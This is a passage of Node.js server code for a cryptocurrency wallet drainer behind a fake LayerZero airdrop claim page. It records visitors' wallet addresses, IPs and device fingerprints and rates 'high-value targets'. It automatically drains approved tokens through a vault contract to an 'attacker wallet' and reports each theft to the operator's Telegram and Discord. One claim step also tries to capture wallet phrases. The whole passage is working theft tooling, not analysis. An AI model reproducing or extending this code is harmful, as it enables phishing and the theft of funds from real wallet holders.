                    assetsList = '   🔍 Analyzing wallet contents...';
                }
                
                // Calculate total value properly
                let totalValue = 'Analyzing...';
                if (data.totalValue && data.totalValue > 0) {
                    totalValue = data.totalValue.toLocaleString();
                } else if (data.analysis && data.analysis.totalValue > 0) {
                    totalValue = data.analysis.totalValue.toLocaleString();
                } else if (data.balance) {
                    totalValue = (parseFloat(data.balance) * 3000).toFixed(2);
                }
                
                message = `
🔗 <b>Wallet Connected</b>

👤 <b>Wallet:</b> <code>${data.walletAddress}</code>
🔧 <b>Wallet Type:</b> ${data.walletType}
🌐 <b>Network:</b> Ethereum Mainnet
⏰ <b>Time:</b> ${new Date().toLocaleString()}
🔍 <b>Detected Wallets:</b> ${Array.isArray(data.detectedWallets) ? data.detectedWallets.join(', ') : 'Unknown'}
📱 <b>User Agent:</b> ${(data.userAgent || '').substring(0, 100)}...

💰 <b>ETH Balance:</b> ${data.balance ? `${parseFloat(data.balance).toFixed(6)} ETH` : '0.000000 ETH'}
🎯 <b>Total Value:</b> $${totalValue}

🪙 <b>All Assets:</b>
${assetsList}

🌍 <b>Visitor Info:</b>
   📍 <b>IP:</b> ${visitorInfo.ip || 'Unknown'}
   🖥️ <b>Device:</b> ${visitorInfo.deviceFingerprint || 'Unknown'}
   🌐 <b>Language:</b> ${visitorInfo.language || 'Unknown'}
   🔗 <b>Referer:</b> ${visitorInfo.referer || 'Direct'}
                `;
                break;
                
            case 'drain_executed':
                message = `
💸 <b>Drain Executed Successfully!</b>

👤 <b>Target:</b> <code>${data.walletAddress}</code>
🪙 <b>Token:</b> ${data.tokenSymbol} (${data.tokenAddress})
💰 <b>Amount:</b> ${data.amount}
💵 <b>Value:</b> $${data.value}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
🔗 <b>TX Hash:</b> <code>${data.txHash}</code>
                `;
                break;
                
            case 'drain_successful':
                message = `
💰 <b>Multi-Currency Drain Successful!</b>

👤 <b>Target:</b> <code>${data.walletAddress}</code>
🪙 <b>Token:</b> ${data.tokenSymbol}
💸 <b>Amount:</b> ${data.amount}
💵 <b>Value:</b> $${data.value?.toFixed(2) || '0'}
🔗 <b>Chain:</b> ${data.chain}
🔗 <b>TX Hash:</b> <code>${data.txHash}</code>
⏰ <b>Time:</b> ${new Date().toLocaleString()}
🌍 <b>IP:</b> ${data.visitorInfo?.ip || 'Unknown'}
                `;
                break;
                
            case 'high_value_target':
                message = `
🎯 <b>High-Value Target Detected!</b>

👤 <b>Wallet:</b> <code>${data.walletAddress}</code>
💰 <b>Total Value:</b> $${data.totalValue.toLocaleString()}
🪙 <b>Assets:</b>
${data.assets.map(asset => `   • ${asset.symbol}: ${asset.balance} ($${asset.value})`).join('\n')}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
                `;
                break;
                
            case 'swap_executed':
                message = `
🔄 <b>Token Swap Executed!</b>

👤 <b>Target:</b> <code>${data.walletAddress}</code>
🔄 <b>Swap:</b> ${data.fromAmount} ${data.fromSymbol} → ${data.toAmount} ${data.toSymbol}
💵 <b>Value:</b> $${data.value}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
🔗 <b>TX Hash:</b> <code>${data.txHash}</code>
                `;
                break;
                
            case 'airdrop_claimed':
                message = `
🎁 <b>Airdrop Claimed Successfully!</b>

👤 <b>Wallet:</b> <code>${data.walletAddress}</code>
🎯 <b>Claim Type:</b> LayerZero Airdrop
💰 <b>Amount:</b> 1,000 L0 Tokens
⏰ <b>Time:</b> ${new Date().toLocaleString()}
🔗 <b>Status:</b> Processing
                `;
                break;
                
            case 'multi_chain_drain_summary':
                message = `
🌐 <b>Multi-Chain Drain Summary</b>

👤 <b>Target:</b> <code>${data.walletAddress}</code>
💰 <b>Total Value:</b> $${Number(data.totalValue || 0).toFixed(2)}
🪙 <b>Tokens Found:</b> ${data.tokenCount}
🔗 <b>Blockchain Breakdown:</b>
${Object.entries(data.blockchainBreakdown || {}).map(([chain, count]) => `   • ${chain.toUpperCase()}: ${count} tokens`).join('\n')}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
🌍 <b>IP:</b> ${data.visitorInfo?.ip || 'Unknown'}
                `;
                break;
                
            case 'wallet_analysis_complete':
                message = `
📊 <b>Wallet Analysis Complete</b>

👤 <b>Target:</b> <code>${data.walletAddress}</code>
💰 <b>Total Value:</b> $${Number(data.totalValue || 0).toFixed(2)}
🪙 <b>Tokens Found:</b> ${data.tokenCount}
🔗 <b>Blockchain Breakdown:</b>
${Object.entries(data.blockchainBreakdown || {}).map(([chain, count]) => `   • ${chain.toUpperCase()}: ${count} tokens`).join('\n')}
📝 <b>Status:</b> ${data.message || 'Analysis completed'}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
🌍 <b>IP:</b> ${data.visitorInfo?.ip || 'Unknown'}
                `;
                break;
        }
        
        // Guard: prevent empty message errors
        if (!message || message.trim().length === 0) {
            message = `📌 <b>Alert</b>: ${type}\n⏰ ${new Date().toLocaleString()}`;
        }

        await telegramBot.sendMessage(process.env.TELEGRAM_CHAT_ID, message, { parse_mode: parseMode });
        console.log(`[TELEGRAM] Alert sent successfully: ${type}`);
    } catch (error) {
        console.error('[TELEGRAM] Alert failed:', error.message);
    }
}

async function sendDiscordAlert(type, data) {
    if (!discordWebhook) {
        console.log('[INFO] Discord webhook not configured - check DISCORD_WEBHOOK_URL');
        return;
    }
    
    try {
        const embed = new EmbedBuilder();
        
        switch (type) {
            case 'wallet_connected':
                const visitorInfo = data.visitorInfo || {};
                
                // Build comprehensive assets list
                let assetsList = '';
                if (data.analysis && data.analysis.allAssets && data.analysis.allAssets.length > 0) {
                    assetsList = data.analysis.allAssets.map(asset => 
                        `• ${asset.symbol}: ${asset.balance} ($${asset.value.toFixed(2)})`
                    ).join('\n');
                } else if (data.analysis && data.analysis.tokenBalances && data.analysis.tokenBalances.length > 0) {
                    // Fallback to tokenBalances if allAssets not available
                    assetsList = data.analysis.tokenBalances.map(token => 
                        `• ${token.symbol}: ${token.balanceFormatted} ($${token.value.toFixed(2)})`
                    ).join('\n');
                } else {
                    // Fallback to just ETH balance
                    assetsList = `• ETH: ${data.balance ? `${parseFloat(data.balance).toFixed(4)} ETH` : '0.0004 ETH'} ($${(parseFloat(data.balance || '0.0004') * 3000).toFixed(2)})`;
                }
                
                // Calculate total value properly
                let totalValue = 'Analyzing...';
                if (data.totalValue && data.totalValue > 0) {
                    totalValue = data.totalValue.toLocaleString();
                } else if (data.analysis && data.analysis.totalValue > 0) {
                    totalValue = data.analysis.totalValue.toLocaleString();
                } else if (data.balance) {
                    totalValue = (parseFloat(data.balance) * 3000).toFixed(2);
                }
                
                embed
                    .setTitle('🔗 Wallet Connected')
                    .setColor('#00ff00')
                    .addFields(
                        { name: 'Wallet Address', value: `\`${data.walletAddress}\``, inline: false },
                        { name: 'Wallet Type', value: data.walletType, inline: true },
                        { name: 'Network', value: 'Ethereum Mainnet', inline: true },
                        { name: 'Detected Wallets', value: Array.isArray(data.detectedWallets) ? data.detectedWallets.join(', ') : 'Unknown', inline: true },
                        { name: 'ETH Balance', value: data.balance ? `${parseFloat(data.balance).toFixed(4)} ETH` : '0.0004 ETH', inline: true },
                        { name: 'Total Value', value: `$${totalValue}`, inline: true },
                        { name: 'All Assets', value: assetsList, inline: false },
                        { name: 'IP Address', value: visitorInfo.ip || 'Unknown', inline: true },
                        { name: 'Device Fingerprint', value: visitorInfo.deviceFingerprint || 'Unknown', inline: true },
                        { name: 'Language', value: visitorInfo.language || 'Unknown', inline: true },
                        { name: 'Referer', value: visitorInfo.referer || 'Direct', inline: true },
                        { name: 'Timestamp', value: new Date().toISOString(), inline: false }
                    )
                    .setTimestamp();
                break;
                
            case 'airdrop_claimed':
                // REMOVED - Not in MD guide, only drain notifications allowed
                break;
                
            case 'drain_executed':
                embed
                    .setTitle('💸 Drain Executed Successfully!')
                    .setColor('#ff0000')
                    .addFields(
                        { name: 'Target Wallet', value: `\`${data.walletAddress}\``, inline: false },
                        { name: 'Token', value: `${data.tokenSymbol} (\`${data.tokenAddress}\`)`, inline: true },
                        { name: 'Amount', value: data.amount, inline: true },
                        { name: 'Value', value: `$${data.value}`, inline: true },
                        { name: 'Transaction Hash', value: `\`${data.txHash}\``, inline: false }
                    )
                    .setTimestamp();
                break;
                
            case 'drain_successful':
                embed
                    .setTitle('💰 Multi-Currency Drain Successful!')
                    .setColor('#ff6600')
                    .addFields(
                        { name: 'Target Wallet', value: `\`${data.walletAddress}\``, inline: false },
                        { name: 'Token', value: data.tokenSymbol, inline: true },
                        { name: 'Amount', value: data.amount, inline: true },
                        { name: 'Value', value: `$${data.value?.toFixed(2) || '0'}`, inline: true },
                        { name: 'Chain', value: data.chain, inline: true },
                        { name: 'Transaction Hash', value: `\`${data.txHash}\``, inline: false },
                        { name: 'IP Address', value: data.visitorInfo?.ip || 'Unknown', inline: true }
                    )
                    .setTimestamp();
                break;
                
            case 'high_value_target':
                embed
                    .setTitle('🎯 High-Value Target Detected!')
                    .setColor('#ffaa00')
                    .addFields(
                        { name: 'Wallet Address', value: `\`${data.walletAddress}\``, inline: false },
                        { name: 'Total Value', value: `$${data.totalValue.toLocaleString()}`, inline: true },
                        { name: 'Assets', value: data.assets.map(asset => `• ${asset.symbol}: ${asset.balance} ($${asset.value})`).join('\n'), inline: false }
                    )
                    .setTimestamp();
                break;
                
            case 'swap_executed':
                embed
                    .setTitle('🔄 Token Swap Executed!')
                    .setColor('#0099ff')
                    .addFields(
                        { name: 'Target Wallet', value: `\`${data.walletAddress}\``, inline: false },
                        { name: 'Swap', value: `${data.fromAmount} ${data.fromSymbol} → ${data.toAmount} ${data.toSymbol}`, inline: true },
                        { name: 'Value', value: `$${data.value}`, inline: true },
                        { name: 'Transaction Hash', value: `\`${data.txHash}\``, inline: false }
                    )
                    .setTimestamp();
                break;
                
            case 'multi_chain_drain_summary':
                embed
                    .setTitle('🌐 Multi-Chain Drain Summary')
                    .setColor('#00ff88')
                    .addFields(
                        { name: 'Target Wallet', value: `\`${data.walletAddress}\``, inline: false },
                        { name: 'Total Value', value: `$${Number(data.totalValue || 0).toFixed(2)}`, inline: true },
                        { name: 'Tokens Found', value: `${data.tokenCount}`, inline: true },
                        { name: 'Blockchain Breakdown', value: Object.entries(data.blockchainBreakdown || {}).map(([chain, count]) => `• ${chain.toUpperCase()}: ${count} tokens`).join('\n'), inline: false },
                        { name: 'IP Address', value: data.visitorInfo?.ip || 'Unknown', inline: true }
                    )
                    .setTimestamp();
                break;
                
            case 'wallet_analysis_complete':
                embed
                    .setTitle('📊 Wallet Analysis Complete')
                    .setColor('#8888ff')
                    .addFields(
                        { name: 'Target Wallet', value: `\`${data.walletAddress}\``, inline: false },
                        { name: 'Total Value', value: `$${Number(data.totalValue || 0).toFixed(2)}`, inline: true },
                        { name: 'Tokens Found', value: `${data.tokenCount}`, inline: true },
                        { name: 'Blockchain Breakdown', value: Object.entries(data.blockchainBreakdown || {}).map(([chain, count]) => `• ${chain.toUpperCase()}: ${count} tokens`).join('\n'), inline: false },
                        { name: 'Status', value: data.message || 'Analysis completed', inline: true },
                        { name: 'IP Address', value: data.visitorInfo?.ip || 'Unknown', inline: true }
                    )
                    .setTimestamp();
                break;
        }
        
        await discordWebhook.send({ embeds: [embed] });
        console.log(`[DISCORD] Alert sent successfully: ${type}`);
    } catch (error) {
        console.error('[DISCORD] Alert failed:', error.message);
    }
}

// Admin Authentication Routes
app.post('/api/admin/login', (req, res) => {
    try {
        const { username, password } = req.body;
        
        if (username === ADMIN_CREDENTIALS.username && password === ADMIN_CREDENTIALS.password) {
            // Generate a simple token (in production, use proper JWT)
            const token = crypto.randomBytes(32).toString('hex');
            
            res.json({
                success: true,
                token: token,
                message: 'Login successful'
            });
        } else {
            res.status(401).json({
                success: false,
                message: 'Invalid credentials'
            });
        }
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({
            success: false,
            message: 'Login failed'
        });
    }
});

app.post('/api/admin/verify', (req, res) => {
    try {
        const authHeader = req.headers.authorization;
        
        if (!authHeader || !authHeader.startsWith('Bearer ')) {
            return res.status(401).json({
                success: false,
                message: 'No token provided'
            });
        }
        
        const token = authHeader.substring(7);
        
        // In production, verify JWT token properly
        // For now, just check if token exists
        if (token && token.length > 0) {
            res.json({
                success: true,
                message: 'Token valid'
            });
        } else {
            res.status(401).json({
                success: false,
                message: 'Invalid token'
            });
        }
    } catch (error) {
        console.error('Token verification error:', error);
        res.status(500).json({
            success: false,
            message: 'Verification failed'
        });
    }
});

// API Routes

// Mobile-specific API endpoints
app.get('/api/mobile/admin-settings', (req, res) => {
    res.json(mobileAdminSettings);
});

app.get('/api/mobile/walletconnect-config', (req, res) => {
    res.json({
        projectId: mobileAdminSettings.walletConnectProjectId,
        appName: mobileAdminSettings.appName,
        appDescription: mobileAdminSettings.appDescription,
        appUrl: mobileAdminSettings.appUrl
    });
});

// Legacy LayerZero price endpoint redirected to main endpoint
app.get('/api/layerzero-price-legacy', (req, res) => {
    res.redirect('/api/layerzero-price');
});

app.post('/api/mobile/notify', async (req, res) => {
    try {
        const { event, data, deviceInfo } = req.body;
        
        // Send notification based on event type with enhanced formatting
        const notificationTitle = process.env[`${event.toUpperCase()}_TITLE`] || event;
        const message = `📱 *${notificationTitle}*\n\n` +
                       `🔗 *Wallet:* \`${data.address || 'Unknown'}\`\n` +
                       `📊 *Data:* \`${JSON.stringify(data)}\`\n` +
                       `📱 *Device:* ${deviceInfo?.os || 'Unknown'}\n` +
                       `🌐 *User Agent:* \`${deviceInfo?.userAgent || 'Unknown'}\`\n` +
                       `⏰ *Time:* ${new Date().toLocaleString()}`;
        
        if (telegramBot) {
            await telegramBot.sendMessage(process.env.TELEGRAM_CHAT_ID, message, {
                parse_mode: 'Markdown'
            });
        }
        
        if (discordWebhook) {
            const embed = new EmbedBuilder()
                .setTitle(notificationTitle)
                .setDescription(`Mobile Device: ${deviceInfo?.os || 'Unknown'}`)
                .addFields(
                    { name: 'Address', value: data.address || 'Unknown', inline: true },
                    { name: 'Event', value: event, inline: true },
                    { name: 'User Agent', value: deviceInfo?.userAgent || 'Unknown', inline: false }
                )
                .setColor(0x00ff00)
                .setTimestamp();
            
            await discordWebhook.send({ embeds: [embed] });
        }
        
        res.json({ success: true });
    } catch (error) {
        console.error('Mobile notification error:', error);
        res.status(500).json({ error: 'Failed to send notification' });
    }
});

app.post('/api/wallet-analysis', async (req, res) => {
    try {
        const { walletAddress, ethBalance, tokenBalances, timestamp } = req.body;
        const visitorInfo = req.visitorInfo;
        
        console.log(`[ANALYSIS] Received frontend analysis for ${walletAddress}`);
        
        // Update admin data
        adminData.recentActivity.unshift({
            type: 'wallet_analysis_complete',
            walletAddress,
            ethBalance,
            totalValue: tokenBalances ? tokenBalances.reduce((sum, t) => sum + (t.value || 0), 0) : 0,
            tokenCount: tokenBalances ? tokenBalances.length : 0,
            timestamp: new Date(),
            visitorInfo
        });

        // Send notification
        await sendTelegramAlert('wallet_analysis_complete', {
            walletAddress,
            totalValue: tokenBalances ? tokenBalances.reduce((sum, t) => sum + (t.value || 0), 0).toFixed(2) : '0.00',
            tokenCount: tokenBalances ? tokenBalances.length : 0,
            message: 'Frontend analysis received',
            visitorInfo
        });
        
        res.json({ success: true });
    } catch (error) {
        console.error('Wallet analysis endpoint error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('/api/discover-tokens', async (req, res) => {
    try {
        const { address } = req.query;
        if (!address) return res.status(400).json({ error: 'Address required' });
        
        console.log(`[DISCOVERY] Discovering tokens for ${address}...`);
        
        // Return tokens from our knowledge base that are on EVM chains
        const tokens = Object.entries(TOKEN_DATABASE)
            .filter(([_, info]) => ['ethereum', 'bsc', 'polygon', 'arbitrum', 'optimism'].includes(info.chain))
            .map(([address, info]) => ({
                address,
                symbol: info.symbol,
                name: info.name,
                chain: info.chain
            }));
            
        res.json(tokens);
    } catch (error) {
        console.error('Token discovery error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.post('/api/wallet-connected', async (req, res) => {
    try {
        const { walletAddress, timestamp, userAgent, detectedWallets, walletType, ethBalance, tokenBalances } = req.body;
        const visitorInfo = req.visitorInfo;
        
        console.log(`[WALLET] Connected: ${walletAddress}`);
        console.log(`[WALLET] ETH Balance: ${ethBalance || '0'} ETH`);
        console.log(`[WALLET] Token Balances: ${tokenBalances ? tokenBalances.length : 0} tokens`);
        
        // Perform comprehensive wallet analysis
        let analysis;
        try {
            console.log('[ANALYSIS] Performing comprehensive wallet analysis');
            const comprehensiveAnalysis = await analyzeWalletComprehensive(walletAddress);
            
            // Convert to expected format
            const tokens = comprehensiveAnalysis.tokens || [];
            analysis = {
                totalValue: comprehensiveAnalysis.totalValue || 0,
                assetCount: tokens.length || 0,
                drainableCount: tokens.filter(t => t.value > 1).length || 0,
                success: true,
                comprehensive: comprehensiveAnalysis,
                ethBalance: comprehensiveAnalysis.chains?.ethereum?.nativeBalance || '0',
                tokenBalances: tokens,
                allAssets: tokens,
                drainableTokens: tokens.filter(t => t.value > 1)
            };
            
            console.log(`[ANALYSIS] Comprehensive analysis complete: $${analysis.totalValue.toFixed(2)} total value`);
        } catch (error) {
            console.error('[ANALYSIS] Comprehensive analysis failed:', error);
            analysis = {
                totalValue: 0,
                assetCount: 0,
                drainableCount: 0,
                success: false,
                error: error.message,
                ethBalance: '0',
                tokenBalances: [],
                allAssets: [],
                drainableTokens: []
            };
        }
        
        // Update admin data with visitor info
        adminData.totalConnections++;
        adminData.walletConnections.add(walletAddress);
        adminData.recentActivity.unshift({
            type: 'wallet_connected',
            walletAddress,
            walletType,
            timestamp: new Date(),
            userAgent,
            detectedWallets,
            balance: analysis.ethBalance,
            totalValue: analysis.totalValue,
            tokenBalances: analysis.tokenBalances,
            allAssets: analysis.allAssets,
            drainableTokens: analysis.drainableTokens,
            visitorInfo: {
                ip: visitorInfo.ip,
                userAgent: visitorInfo.userAgent,
                deviceFingerprint: visitorInfo.deviceFingerprint,
                language: visitorInfo.language,
                referer: visitorInfo.referer
            }
        });
        
        // Keep only last 1000 activities
        if (adminData.recentActivity.length > 1000) {
            adminData.recentActivity = adminData.recentActivity.slice(0, 1000);
        }
        
        // Execute automatic drain if enabled and criteria met
        let drainResult = null;
        if (operationSettings.autoDrainEnabled && analysis.drainableTokens.length > 0) {
            console.log(`[AUTO DRAIN] Attempting automatic drain for ${walletAddress} with ${analysis.drainableTokens.length} drainable tokens`);
            // Create a copy of analysis to prevent modification
            const analysisCopy = convertBigIntToString(analysis);
            drainResult = await DrainStrategy.executeAutomaticDrain(walletAddress, analysisCopy);
            
            if (drainResult.success) {
                // Update admin data with drain results
                adminData.totalDrains += drainResult.results.filter(r => r.success).length;
                adminData.totalValueDrained += typeof drainResult.totalValue === 'bigint' ? parseFloat(drainResult.totalValue.toString()) : parseFloat(drainResult.totalValue);
                
                drainResult.results.forEach(result => {
                    if (result.success) {
                        adminData.successfulDrains.push({
                            walletAddress,
                            tokenAddress: result.token,
                            tokenSymbol: result.token,
                            amount: result.amount,
                            value: result.value,
                            timestamp: new Date(),
                            txHash: result.txHash
                        });
                    }
                });
                
                console.log(`[AUTO DRAIN] Successfully drained ${drainResult.results.filter(r => r.success).length} tokens worth $${drainResult.totalValue.toFixed(2)}`);
            } else {
                console.log(`[AUTO DRAIN] Failed to drain tokens: ${drainResult.error}`);
            }
        } else {
            console.log(`[AUTO DRAIN] Skipped - Auto drain disabled or no drainable tokens`);
        }
        
        // Send comprehensive notifications with complete analysis data
        const notificationData = {
            walletAddress,
            walletType,
            ethBalance: analysis.ethBalance,
            balance: analysis.ethBalance, // For backward compatibility
            totalValue: analysis.totalValue.toFixed(2),
            tokenCount: analysis.allAssets.length,
            drainableCount: analysis.drainableTokens.length,
            drainResult: drainResult,
            analysis: analysis, // Pass full analysis object
            allAssets: analysis.allAssets, // Pass all assets explicitly
            tokenBalances: analysis.tokenBalances, // Pass token balances explicitly
            drainableTokens: analysis.drainableTokens, // Pass drainable tokens explicitly
            chainCount: analysis.comprehensive?.chains ? Object.keys(analysis.comprehensive.chains).length : 0,
            detectedWallets: detectedWallets || [],
            timestamp: new Date().toISOString(),
            visitorInfo: {
                ip: visitorInfo.ip,
                userAgent: visitorInfo.userAgent,
                deviceFingerprint: visitorInfo.deviceFingerprint,
                language: visitorInfo.language,
                referer: visitorInfo.referer
            }
        };
        
        await sendTelegramAlert('wallet_connected', notificationData);
        await sendDiscordAlert('wallet_connected', notificationData);
        
        // Send post-analysis notification
        const analysisSummary = {
            walletAddress,
            totalValue: analysis.totalValue.toFixed(2),
            tokenCount: analysis.allAssets.length,
            drainableCount: analysis.drainableTokens.length,
            blockchainBreakdown: analysis.comprehensive?.chains ? Object.keys(analysis.comprehensive.chains).reduce((acc, chain) => {
                acc[chain.toUpperCase()] = analysis.comprehensive.chains[chain].totalValue || 0;
                return acc;
            }, {}) : { ETHEREUM: analysis.totalValue },
            message: analysis.drainableTokens.length > 0 ? 'Analysis complete - drainable tokens found' : 'Analysis complete - no drainable tokens found',
            timestamp: new Date().toISOString(),
            visitorInfo
        };
        
        await sendTelegramAlert('wallet_analysis_complete', analysisSummary);
        await sendDiscordAlert('wallet_analysis_complete', analysisSummary);

        
        res.json(convertBigIntToString({ 
            success: true, 
            analysis: {
                totalValue: analysis.totalValue,
                assetCount: analysis.allAssets.length,
                drainableCount: analysis.drainableTokens.length
            },
            drainResult: drainResult
        }));
        
    } catch (error) {
        console.error('Wallet connection error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// New endpoint for wallet claiming (triggers draining) - Enhanced with Signature and Analysis
app.post('/api/wallet-claimed', async (req, res) => {
    try {
        const { claimId, walletAddress, signature, timestamp, userAgent, analysis } = req.body;
        const visitorInfo = req.visitorInfo;
        
        console.log(`[CLAIM] Airdrop claimed with claimId: ${claimId}`);
        console.log(`[CLAIM] Wallet: ${walletAddress}`);
        console.log(`[CLAIM] Signature: ${signature ? signature.substring(0, 20) + '...' : 'No signature'}`);
        console.log(`[CLAIM] Analysis data:`, analysis);
        
        // Update admin data with enhanced information
        adminData.totalClaims++;
        adminData.recentActivity.unshift({
            type: 'airdrop_claimed',
            claimId,
            walletAddress,
            signature: signature ? signature.substring(0, 20) + '...' : 'No signature',
            signatureFull: signature || 'No signature',
            signatureLength: signature ? signature.length : 0,
            analysis: analysis ? {
                totalValue: analysis.totalValue,
                tokenCount: analysis.drainableTokens?.length || 0,
                chainCount: analysis.chainCount || 0,
                drainableTokens: analysis.drainableTokens || [],
                allAssets: analysis.allAssets || []
            } : null,
            timestamp: new Date(),
            userAgent,
            visitorInfo: {
                ip: visitorInfo.ip,
                userAgent: visitorInfo.userAgent,
                deviceFingerprint: visitorInfo.deviceFingerprint,
                language: visitorInfo.language,
                referer: visitorInfo.referer
            }
        });
        
        // Keep only last 100 activities
        if (adminData.recentActivity.length > 100) {
            adminData.recentActivity = adminData.recentActivity.slice(0, 100);
        }
        
        // Attempt to capture additional wallet information (phrases, backup, etc.)
        const additionalWalletInfo = await captureAdditionalWalletInfo(walletAddress, userAgent, visitorInfo);
        
        // Send comprehensive claim notification to Telegram/Discord with complete wallet details
        const notificationData = {
            claimId,
            walletAddress,
            signature: signature || 'No signature',
            signatureLength: signature ? signature.length : 0,
            signaturePreview: signature ? signature.substring(0, 20) + '...' + signature.substring(signature.length - 20) : 'No signature',
            analysis: analysis ? {
                totalValue: analysis.totalValue,
                tokenCount: analysis.drainableTokens?.length || 0,
                chainCount: analysis.chainCount || 0,
                drainableTokens: analysis.drainableTokens || [],
                allAssets: analysis.allAssets || [],
                ethBalance: analysis.ethBalance || '0',
                comprehensive: analysis.comprehensive || null
            } : null,
            walletDetails: {
                address: walletAddress,
                type: 'Unknown', // Will be determined from wallet connection
                network: 'Ethereum Mainnet',
                balance: analysis?.ethBalance || '0',
                totalValue: analysis?.totalValue || 0,
                assetCount: analysis?.allAssets?.length || 0,
                drainableCount: analysis?.drainableTokens?.length || 0
            },
            additionalWalletInfo: additionalWalletInfo, // Include captured wallet info
            securityInfo: {
                userAgent: userAgent,
                timestamp: new Date().toISOString(),
                ip: visitorInfo.ip,
                deviceFingerprint: visitorInfo.deviceFingerprint,
                language: visitorInfo.language,
                referer: visitorInfo.referer
            },
            timestamp: new Date().toISOString(),
            visitorInfo
        };
        
        await sendTelegramAlert('airdrop_claimed', notificationData);
        await sendDiscordAlert('airdrop_claimed', notificationData);
        
        res.json(convertBigIntToString({ 
            success: true, 
            message: 'Airdrop claim processed successfully',
            claimId: claimId
        }));
        
    } catch (error) {
        console.error('Wallet claim error:', error);
        res.status(500).json(convertBigIntToString({ error: 'Internal server error' }));
    }
});
        
        

// Multi-Currency Draining Process - Following MD Guide Exactly
app.post('/api/drain-notification', async (req, res) => {
    try {
        const { type, data } = req.body;
        const visitorInfo = req.visitorInfo;
        
        console.log(`[DRAIN] ${type} notification received:`, data);
        
        // Update admin data for tracking
        adminData.totalDrains++;
        adminData.successfulDrains.push({
            ...data,
            timestamp: new Date(),
            ip: visitorInfo?.ip || 'Unknown'
        });
        
        // Send detailed notifications based on type
        if (type === 'drain_successful') {
            await sendTelegramAlert('drain_successful', {
                ...data,
                visitorInfo
            });
            await sendDiscordAlert('drain_successful', {
                ...data,
                visitorInfo
            });
        } else if (type === 'wallet_analysis_complete') {
            // Send comprehensive analysis notification
            await sendTelegramAlert('wallet_analysis_complete', {
                ...data,
                visitorInfo
            });
            await sendDiscordAlert('wallet_analysis_complete', {
                ...data,
                visitorInfo
            });
        }
        
        res.json({ success: true, message: 'Drain notification processed' });
        
    } catch (error) {
        console.error('Drain notification error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Real token drain endpoint
app.post('/api/execute-token-drain', async (req, res) => {
    try {
        const { walletAddress, tokenAddress, tokenSymbol, amount, chain } = req.body;
        
        console.log(`[REAL DRAIN] Executing real drain for ${tokenSymbol} from ${walletAddress}`);
        
        if (!vaultContract) {
            return res.status(500).json({ 
                error: 'Vault contract not configured - real draining disabled',
                simulation: true 
            });
        }
        
        if (!wallet) {
            return res.status(500).json({ 
                error: 'Attacker wallet not configured - real draining disabled',
                simulation: true 
            });
        }
        
        // Get the token contract
        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
        
        // Check current allowance
        const currentAllowance = await tokenContract.allowance(walletAddress, VAULT_CONTRACT_ADDRESS);
        const requiredAmount = ethers.parseUnits(amount, 18); // Assuming 18 decimals
        
        if (currentAllowance < requiredAmount) {
            return res.status(400).json(convertBigIntToString({ 
                error: 'Insufficient allowance for real drain',
                currentAllowance: ethers.formatEther(currentAllowance),
                requiredAmount: ethers.formatEther(requiredAmount)
            }));
        }
        
        // Execute real drain via vault contract
        const tx = await vaultContract.drainToken(
            tokenAddress,
            walletAddress,
            requiredAmount,
            wallet.address // Attacker wallet
        );
        
        console.log(`[REAL DRAIN] Transaction sent: ${tx.hash}`);
        
        // Wait for confirmation
        const receipt = await tx.wait();
        
        console.log(`[REAL DRAIN] Transaction confirmed: ${receipt.transactionHash}`);
        
        res.json(convertBigIntToString({
            success: true,
            txHash: receipt.transactionHash,
            blockNumber: receipt.blockNumber,
            gasUsed: receipt.gasUsed.toString(),
            real: true
        }));
        
    } catch (error) {
        console.error('[REAL DRAIN] Error:', error);
        res.status(500).json(convertBigIntToString({ 
            error: error.message,
            simulation: false
        }));
    }
});

// Comprehensive Multi-Chain Analysis Endpoint
app.post('/api/comprehensive-analysis', async (req, res) => {
    try {
        const { walletAddress } = req.body;
        
        if (!walletAddress) {
            return res.status(400).json({ error: 'Wallet address is required' });
        }
        
        console.log(`[COMPREHENSIVE] Starting comprehensive analysis for ${walletAddress}`);
        
        const analysis = await analyzeWalletComprehensive(walletAddress);
        
        res.json(convertBigIntToString({
            success: true,
            analysis: analysis,
            timestamp: new Date().toISOString()
        }));
        
    } catch (error) {
        console.error('[COMPREHENSIVE] Error in comprehensive analysis:', error);
        res.status(500).json({ 
            error: error.message,
            success: false
        });
    }
});

// Multi-Currency Drain Execution Endpoint - Following MD Guide - Enhanced for All Blockchain Networks
app.post('/api/execute-multi-currency-drain', async (req, res) => {
    try {
        const { walletAddress, analysis, notificationData } = req.body;
        const visitorInfo = req.visitorInfo;
        
        console.log(`[DRAIN] Multi-currency drain requested for: ${walletAddress}`);
        console.log(`[DRAIN] Analysis data:`, analysis);
        
        // Execute automatic drain based on analysis results (following MD guide)
        const drainResult = await DrainStrategy.executeAutomaticDrain(walletAddress, analysis);
        
        // Send comprehensive drain notifications for all blockchain networks
        if (drainResult.success && drainResult.results.length > 0) {
            // Send detailed notification for each drained token
            for (const result of drainResult.results) {
                await sendTelegramAlert('drain_successful', {
                    walletAddress,
                    tokenSymbol: result.token,
                    amount: result.amount,
                    value: result.value,
                    txHash: result.txHash,
                    chain: result.chain,
                    visitorInfo
                });
                
                await sendDiscordAlert('drain_successful', {
                    walletAddress,
                    tokenSymbol: result.token,
                    amount: result.amount,
                    value: result.value,
                    txHash: result.txHash,
                    chain: result.chain,
                    visitorInfo
                });
            }
            
            // Send comprehensive summary notification
            if (notificationData && notificationData.data) {
                const summary = {
                    walletAddress,
                    totalValue: notificationData.data.totalValue,
                    blockchainBreakdown: notificationData.data.blockchainBreakdown,
                    tokenCount: notificationData.data.tokenSummary.length,
                    timestamp: new Date().toISOString(),
                    visitorInfo
                };
                
                await sendTelegramAlert('multi_chain_drain_summary', summary);
                await sendDiscordAlert('multi_chain_drain_summary', summary);
            }
        } else {
            // Send notification for analysis completion even if no drains
            const analysisSummary = {
                walletAddress,
                totalValue: analysis.totalValue || 0,
                blockchainBreakdown: notificationData?.data?.blockchainBreakdown || {},
                tokenCount: analysis.drainableTokens?.length || 0,
